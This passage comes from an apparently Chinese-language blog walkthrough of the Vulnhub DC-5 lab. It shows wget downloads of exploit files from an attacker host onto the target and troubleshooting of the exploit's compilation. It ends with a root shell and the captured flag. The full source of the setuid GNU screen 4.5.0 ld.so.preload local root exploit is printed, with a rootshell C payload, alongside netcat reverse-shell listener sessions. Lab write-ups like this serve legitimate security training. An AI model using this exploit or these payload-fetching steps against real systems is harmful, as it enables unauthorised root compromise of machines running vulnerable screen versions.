class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-5:~/html$ pwd  <br>pwd<br>/var/www/html<br>www-data@dc-5:~/html$ wget http://192.168.135.141:8888/41154.sh<br>wget http://192.168.135.141:8888/41154.sh<br>converted &#x27;http://192.168.135.141:8888/41154.sh&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/41154.sh&#x27; (UTF-8)<br>--2022-07-13 01:21:43--  http://192.168.135.141:8888/41154.sh<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 1192 (1.2K) [text/x-sh]<br>41154.sh: Permission denied<br><br>Cannot write to &#x27;41154.sh&#x27; (Permission denied).<br>www-data@dc-5:~/html$ ls -l /var/www<br>ls -l /var/www<br>total 4<br>drwxr-xr-x 4 root root 4096 Apr 20  2019 html<br>www-data@dc-5:~/html$ ls -l / | grep tmp<br>ls -l / | grep tmp<br>drwxrwxrwt   7 root root  4096 Jul 13 01:17 tmp<br>www-data@dc-5:~/html$ wget http://192.168.135.141:8888/41154.sh /tmp<br>wget http://192.168.135.141:8888/41154.sh /tmp<br>converted &#x27;http://192.168.135.141:8888/41154.sh&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/41154.sh&#x27; (UTF-8)<br>--2022-07-13 01:22:37--  http://192.168.135.141:8888/41154.sh<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 1192 (1.2K) [text/x-sh]<br>41154.sh: Permission denied<br><br>Cannot write to &#x27;41154.sh&#x27; (Permission denied).<br>/tmp: Scheme missing.<br>www-data@dc-5:~/html$ cd /tmp<br>cd /tmp<br>www-data@dc-5:/tmp$ wget http://192.168.135.141:8888/41154.sh<br>wget http://192.168.135.141:8888/41154.sh<br>converted &#x27;http://192.168.135.141:8888/41154.sh&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/41154.sh&#x27; (UTF-8)<br>--2022-07-13 01:22:47--  http://192.168.135.141:8888/41154.sh<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 1192 (1.2K) [text/x-sh]<br>Saving to: &#x27;41154.sh&#x27;<br><br>41154.sh            100%[=====================&gt;]   1.16K  --.-KB/s   in 0s     <br><br>2022-07-13 01:22:47 (133 MB/s) - &#x27;41154.sh&#x27; saved [1192/1192]<br><br>www-data@dc-5:/tmp$ ls<br>ls<br>41154.sh<br>www-data@dc-5:/tmp$ chmod +x 41154.sh<br>chmod +x 41154.sh<br>www-data@dc-5:/tmp$ ./41154.sh<br>./41154.sh<br>bash: ./41154.sh: /bin/bash^M: bad interpreter: No such file or directory<br></code></pre></td></tr></table></figure>
+<p>出现了报错，vi 查看，发现每行结尾出现了个 ^M ：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash^M</span><br><span class="hljs-comment"># screenroot.sh^M</span><br><span class="hljs-comment"># setuid screen v4.5.0 local root exploit^M</span><br><span class="hljs-comment"># abuses ld.so.preload overwriting to get root.^M</span><br><span class="hljs-comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html^M</span><br><span class="hljs-comment"># HACK THE PLANET^M</span><br><span class="hljs-comment"># ~ infodox (25/1/2017) ^M</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;~ gnu/screenroot ~&quot;</span>^M<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] First, we create our shell and library...&quot;</span>^M<br></code></pre></td></tr></table></figure>
+<p>kali 上用 vi 打开脚本，末行模式下输入 <code>set ff=unix</code> ，再保存退出</p>
+<blockquote>
+<p><code>set ff=unix</code> : 告诉 vim 编辑器，使用unix换行符</p>
+<p>这里之所以用 kali 是因为靶机上的 vi 不知道怎样使用，好像只能查看似的，摸不到头脑</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> vi 41154.sh</span> <br></code></pre></td></tr></table></figure>
+<p>参考：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hyj_king/article/details/120301359">【Linux】set ff=unix 郝少的博客-CSDN博客_ff=unix</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/364037496">windows下编写的脚本文件，放到Linux中无法执行解决方法 - 知乎 (zhihu.com)</a></p>
+</blockquote>
+<p>靶机再次下载，加可执行权限，运行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-5:/tmp$ wget http://192.168.135.141:8888/41154.sh<br>wget http://192.168.135.141:8888/41154.sh<br>converted &#x27;http://192.168.135.141:8888/41154.sh&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/41154.sh&#x27; (UTF-8)<br>--2022-07-12 06:19:46--  http://192.168.135.141:8888/41154.sh<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 1152 (1.1K) [text/x-sh]<br>Saving to: &#x27;41154.sh&#x27;<br><br>41154.sh            100%[=====================&gt;]   1.12K  --.-KB/s   in 0s     <br><br>2022-07-12 06:19:46 (137 MB/s) - &#x27;41154.sh&#x27; saved [1152/1152]<br><br>www-data@dc-5:/tmp$ ls<br>ls<br>41154.sh<br>www-data@dc-5:/tmp$ chmod +x 41154.sh<br>chmod +x 41154.sh<br>www-data@dc-5:/tmp$ ./41154.sh<br>./41154.sh<br>~ gnu/screenroot ~<br>[+] First, we create our shell and library...<br>gcc: error trying to exec &#x27;cc1&#x27;: execvp: No such file or directory<br>gcc: error trying to exec &#x27;cc1&#x27;: execvp: No such file or directory<br>[+] Now we create our /etc/ld.so.preload file...<br>[+] Triggering...<br>&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>ERROR: ld.so: object &#x27;/tmp/libhax.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>No Sockets found in /tmp/screens/S-www-data.<br><br>./41154.sh: line 42: /tmp/rootshell: No such file or directory<br></code></pre></td></tr></table></figure>
+<p>再次报错，可能靶机 gcc 编译时出错了，尝试 kali 编译：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> chmod +x 41154.sh</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ./41154.sh</span> <br>~ gnu/screenroot ~<br>[+] First, we create our shell and library...<br>/tmp/libhax.c: In function ‘dropshell’:<br>/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]<br>    7 |     chmod(&quot;/tmp/rootshell&quot;, 04755);<br>      |     ^~~~~<br>/tmp/rootshell.c: In function ‘main’:<br>/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]<br>    3 |     setuid(0);<br>      |     ^~~~~~<br>/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]<br>    4 |     setgid(0);<br>      |     ^~~~~~<br>/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]<br>    5 |     seteuid(0);<br>      |     ^~~~~~~<br>/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]<br>    6 |     setegid(0);<br>      |     ^~~~~~~<br>/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]<br>    7 |     execvp(&quot;/bin/sh&quot;, NULL, NULL);<br>      |     ^~~~~~<br>/tmp/rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]<br>[+] Now we create our /etc/ld.so.preload file...<br>[+] Triggering...<br>No Sockets found in /run/screen/S-kali.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>kali<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls /tmp</span><br>libhax.so  rootshell<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> mv /tmp/libhax.so ./</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> mv /tmp/rootshell ./</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls</span>                <br>41154.sh libhax.so  rootshell<br></code></pre></td></tr></table></figure>
+<p>修改一下脚本，将与编译有关的代码删掉：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># screenroot.sh</span><br><span class="hljs-comment"># setuid screen v4.5.0 local root exploit</span><br><span class="hljs-comment"># abuses ld.so.preload overwriting to get root.</span><br><span class="hljs-comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span><br><span class="hljs-comment"># HACK THE PLANET</span><br><span class="hljs-comment"># ~ infodox (25/1/2017) </span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;~ gnu/screenroot ~&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] First, we create our shell and library...&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="hljs-built_in">cd</span> /etc<br><span class="hljs-built_in">umask</span> 000 <span class="hljs-comment"># because</span><br>screen -D -m -L ld.so.preload <span class="hljs-built_in">echo</span> -ne  <span class="hljs-string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="hljs-comment"># newline needed</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Triggering...&quot;</span><br>screen -ls <span class="hljs-comment"># screen itself is setuid, so... </span><br>/tmp/rootshell<br></code></pre></td></tr></table></figure>
+<p>靶机进行下载运行，成功得到 root ：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-5:/tmp$ wget http://192.168.135.141:8888/libhax.so<br>wget http://192.168.135.141:8888/libhax.so<br>converted &#x27;http://192.168.135.141:8888/libhax.so&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/libhax.so&#x27; (UTF-8)<br>--2022-07-12 04:50:05--  http://192.168.135.141:8888/libhax.so<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 15552 (15K) [application/octet-stream]<br>Saving to: &#x27;libhax.so&#x27;<br><br>libhax.so           100%[=====================&gt;]  15.19K  --.-KB/s   in 0s     <br><br>2022-07-12 04:50:05 (69.6 MB/s) - &#x27;libhax.so&#x27; saved [15552/15552]<br><br>www-data@dc-5:/tmp$ wget http://192.168.135.141:8888/rootshell<br>wget http://192.168.135.141:8888/rootshell<br>converted &#x27;http://192.168.135.141:8888/rootshell&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/rootshell&#x27; (UTF-8)<br>--2022-07-12 04:50:17--  http://192.168.135.141:8888/rootshell<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 16336 (16K) [application/octet-stream]<br>Saving to: &#x27;rootshell&#x27;<br><br>rootshell           100%[=====================&gt;]  15.95K  --.-KB/s   in 0s     <br><br>2022-07-12 04:50:17 (109 MB/s) - &#x27;rootshell&#x27; saved [16336/16336]<br><br>www-data@dc-5:/tmp$ wget http://192.168.135.141:8888/41154.sh<br>wget http://192.168.135.141:8888/41154.sh<br>converted &#x27;http://192.168.135.141:8888/41154.sh&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/41154.sh&#x27; (UTF-8)<br>--2022-07-12 04:50:29--  http://192.168.135.141:8888/41154.sh<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 566 [text/x-sh]<br>Saving to: &#x27;41154.sh&#x27;<br><br>41154.sh            100%[=====================&gt;]     566  --.-KB/s   in 0s     <br><br>2022-07-12 04:50:29 (174 MB/s) - &#x27;41154.sh&#x27; saved [566/566]<br><br>www-data@dc-5:/tmp$ chmod +x libhax.so<br>chmod +x libhax.so<br>www-data@dc-5:/tmp$ chmod +x rootshell<br>chmod +x rootshell<br>www-data@dc-5:/tmp$ chmod +x 41154.sh<br>chmod +x 41154.sh<br>www-data@dc-5:/tmp$ ./41154.sh<br>./41154.sh<br>~ gnu/screenroot ~<br>[+] First, we create our shell and library...<br>[+] Now we create our /etc/ld.so.preload file...<br>[+] Triggering...<br>&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>[+] done!<br>No Sockets found in /tmp/screens/S-www-data.<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>whoami<br>root<br><span class="hljs-meta">#</span><span class="bash"> ls /root</span><br>ls /root<br>thisistheflag.txt<br><span class="hljs-meta">#</span><span class="bash"> cat /root/thisistheflag.txt</span><br>cat /root/thisistheflag.txt<br><br><br>888b    888 d8b                                                      888      888 888 888 <br>8888b   888 Y8P                                                      888      888 888 888 <br>88888b  888                                                          888      888 888 888 <br>888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 <br>888 Y88b888 888 d88P&quot;   d8P  Y8b      888  888  888 d88&quot;&quot;88b 888P&quot;   888 .88P 888 888 888 <br>888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P <br>888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 &quot;88b  &quot;   &quot;   &quot;  <br>888    Y888 888  &quot;Y8888P &quot;Y8888        &quot;Y8888888P&quot;   &quot;Y88P&quot;  888     888  888 888 888 888 <br>                                                                                          <br>                                                                                          <br><br><br>Once again, a big thanks to all those who do these little challenges,<br>and especially all those who give me feedback - again, it&#x27;s all greatly<br>appreciated.  :-)<br><br>I also want to send a big thanks to all those who find the vulnerabilities<br>and create the exploits that make these challenges possible.<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> </span><br></code></pre></td></tr></table></figure>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ol>
+<li>文件包含漏洞</li>
+<li>将反弹 shell 写入日志文件，实现反弹</li>
+<li>screen 提权（SUID 提权）：函数劫持</li>
+</ol>
+<h2 id="五、Others"><a href="#五、Others" class="headerlink" title="五、Others"></a>五、Others</h2><p>直接运行 screen-4.5.0 ：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43376075/article/details/124424541">(Must be connected to a terminal解决方法_美豆阿的博客-CSDN博客</a></p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>                                <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.160] 38556<br>/bin/screen-4.5.0<br>Must be connected to a terminal.<br><br>script /dev/null<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> /bin/screen-4.5.0</span><br>/bin/screen-4.5.0<br>Please set a terminal type.<br><span class="hljs-meta">$</span><span class="bash"> script /dev/null</span><br>script /dev/null<br>Script started, file is /dev/null<br><span class="hljs-meta">$</span><span class="bash"> /bin/screen-4.5.0</span><br>/bin/screen-4.5.0<br>Please set a terminal type.<br></code></pre></td></tr></table></figure>
+<p>解决无法运行的问题，但调用的权限并不是 root：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>                                <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.160] 38556<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@dc-5:~/html$ /bin/screen-4.5.0<br>/bin/screen-4.5.0<br>Please set a terminal type.<br><br>www-data@dc-5:~/html$ export -p         <br>export -p<br>declare -x HOME=&quot;/var/www&quot;<br>declare -x OLDPWD<br>declare -x PWD=&quot;/var/www/html&quot;<br>declare -x SHLVL=&quot;1&quot;<br>declare -x USER=&quot;www-data&quot;<br>www-data@dc-5:~/html$ export TERM=&quot;xterm-256color&quot;<br>export TERM=&quot;xterm-256color&quot;<br>www-data@dc-5:~/html$ export -p<br>export -p<br>declare -x HOME=&quot;/var/www&quot;<br>declare -x OLDPWD<br>declare -x PWD=&quot;/var/www/html&quot;<br>declare -x SHLVL=&quot;1&quot;<br>declare -x TERM=&quot;xterm-256color&quot;<br>declare -x USER=&quot;www-data&quot;<br>www-data@dc-5:~/html$ echo $TERM<br>echo $TERM<br>xterm-256color<br><br>www-data@dc-5:~/html$ screen -s /bin/sh<br>screen -s /bin/sh<br>[screen is terminating]<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br><span class="hljs-meta">$</span><span class="bash"> ps -aux | grep screen</span><br>ps -aux | grep screen<br>www-data  1532  0.0  0.2  21832  2252 pts/1    S+   02:23   0:00 screen -s /bin/sh<br>www-data  1543  0.0  0.0  11128   960 pts/2    S+   02:27   0:00 grep screen<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br><br>www-data@dc-5:~/html$ ls -l /bin/screen-4.5.0<br>ls -l /bin/screen-4.5.0<br>-rwsr-xr-x 1 root root 1441352 Apr 19  2019 /bin/screen-4.5.0<br></code></pre></td></tr></table></figure>
+<p>完整的利用脚本：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># screenroot.sh</span><br><span class="hljs-comment"># setuid screen v4.5.0 local root exploit</span><br><span class="hljs-comment"># abuses ld.so.preload overwriting to get root.</span><br><span class="hljs-comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span><br><span class="hljs-comment"># HACK THE PLANET</span><br><span class="hljs-comment"># ~ infodox (25/1/2017) </span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;~ gnu/screenroot ~&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] First, we create our shell and library...&quot;</span><br>cat &lt;&lt; <span class="hljs-string">EOF &gt; /tmp/libhax.c</span><br><span class="hljs-string">#include &lt;stdio.h&gt;</span><br><span class="hljs-string">#include &lt;sys/types.h&gt;</span><br><span class="hljs-string">#include &lt;unistd.h&gt;</span><br><span class="hljs-string">__attribute__ ((__constructor__))</span><br><span class="hljs-string">void dropshell(void)&#123;</span><br><span class="hljs-string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="hljs-string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="hljs-string">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="hljs-string">    printf(&quot;[+] done!\n&quot;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c<br>rm -f /tmp/libhax.c<br>cat &lt;&lt; <span class="hljs-string">EOF &gt; /tmp/rootshell.c</span><br><span class="hljs-string">#include &lt;stdio.h&gt;</span><br><span class="hljs-string">int main(void)&#123;</span><br><span class="hljs-string">    setuid(0);</span><br><span class="hljs-string">    setgid(0);</span><br><span class="hljs-string">    seteuid(0);</span><br><span class="hljs-string">    setegid(0);</span><br><span class="hljs-string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>gcc -o /tmp/rootshell /tmp/rootshell.c<br>rm -f /tmp/rootshell.c<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="hljs-built_in">cd</span> /etc<br><span class="hljs-built_in">umask</span> 000 <span class="hljs-comment"># because</span><br>screen -D -m -L ld.so.preload <span class="hljs-built_in">echo</span> -ne  <span class="hljs-string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="hljs-comment"># newline needed</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Triggering...&quot;</span><br>screen -ls <span class="hljs-comment"># screen itself is setuid, so... </span><br>/tmp/rootshell<br></code></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://man.linuxde.net/screen">screen命令_Linux screen 命令用法详解：用于命令行终端切换 (linuxde.net)</a></p>
+<p><a target="_blank" rel="noopener" href="https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html">[screen-devel] [bug #50142] root exploit 4.5.0 (gnu.org)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sench/p/8933638.html">linux命令—umask - ColdCode - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1683272">LD_PRELOAD 后门 | Linux 后门系列 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/108890018">linux LD_PRELOAD 预加载 so 简介 whatday的博客-CSDN博客_ld_preload</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Penetration/">Penetration</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnhub/">vulnhub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/07/11/Penetration/Vulnhub/Part-1/0x07%20DC-4/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DC：4</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/07/11/Penetration/Vulnhub/Part-1/0x09%20DC-6/">
+                        <span class="hidden-mobile">DC：6</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
